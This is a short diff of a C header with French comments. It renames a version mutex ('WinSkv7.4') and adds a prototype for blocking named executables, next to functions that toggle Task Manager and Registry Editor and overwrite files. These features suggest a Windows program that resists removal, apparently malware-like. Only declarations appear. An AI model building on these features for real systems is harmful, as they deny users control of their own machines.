@@ -27,7 +27,7 @@
 #define CRYPT_KEY                   956636 // @@ entier
 //#define CRYPT_KEY                   "" // si chaine vide, le mdp par défaut de la fonction crypt sera utilisé
 
-#define NOM_MUTEX                   "WinSkv7.2" // Le numéro de version doit changer pour chaque nouvelle version/nv changement
+#define NOM_MUTEX                   "WinSkv7.4" // Le numéro de version doit changer pour chaque nouvelle version/nv changement
 
 #define TAILLE_MAX_PATH             131
 #define TAILLE_TMP                  2048
@@ -258,6 +258,7 @@ BOOL ecraserFichier(char *path, char *nomFichier);
 int strCharOccur(char *chaine, char caractere);
 int setTaskManager(BOOL taskManagerState);
 int setRegistryEditor(BOOL state);
+int disallowExeRun(char* exeName, char* exeNumber);
 BOOL is_file(const char* path);
 BOOL is_dir(const char* path);
 
